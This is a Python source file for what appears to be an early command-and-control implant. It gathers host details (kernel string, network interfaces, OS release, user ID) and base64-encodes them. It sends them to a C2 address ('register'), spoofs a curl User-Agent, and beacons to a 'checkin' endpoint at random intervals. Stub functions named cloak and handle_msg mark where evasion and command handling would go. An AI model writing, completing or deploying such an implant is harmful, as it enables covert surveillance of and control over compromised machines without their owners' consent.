import json
import os
import random
import re
import subprocess
from base64 import b64encode
from time import sleep
from urllib import request

c2 = 'http://localhost:5000/'
loc = 'register'
chloc = 'checkin'


def cloak():
    pass


def parse_msg(html):
    for line in html.decode().split('\n'):
        if '_csrf_token' in line:
            return re.search('value="(.*)"', line).group(1)


def register() -> str:
    while True:
        r = None
        try:
            r = request.urlopen(request.Request(c2 + loc, data=b64encode(info.encode()),
                                                headers={'User-Agent': 'curl/7.54.0'}))
        except Exception as e:
            print(e)
        if r and r.getcode() == 200:
            return parse_msg(r.read())
        else:
            print("Failed, trying again in 60 sec...")
            sleep(random.randint(45, 70))


def handle_msg(msg):
    pass


def check_in():
    r = None
    try:
        r = request.urlopen(request.Request(c2 + chloc, headers={'User-Agent': 'curl/7.54.0'}))
    except Exception as e:
        print(e)
    else:
        handle_msg(parse_msg(r.read()))


def get_info():
    k = subprocess.check_output(['uname', '-a']).decode()
    try:
        i = subprocess.check_output(['ifconfig']).decode()
    except FileNotFoundError:
        i = subprocess.check_output(['/sbin/ifconfig']).decode()
    o = open('/etc/os-release').read()
    u = os.getuid()
    return json.dumps(dict(k=k, i=i, o=o, u=u))


if __name__ == '__main__':
    info = get_info()
    cloak()
    key = register()
    print(key)
    while True:
        sleep(random.randint(45, 75))
        check_in()
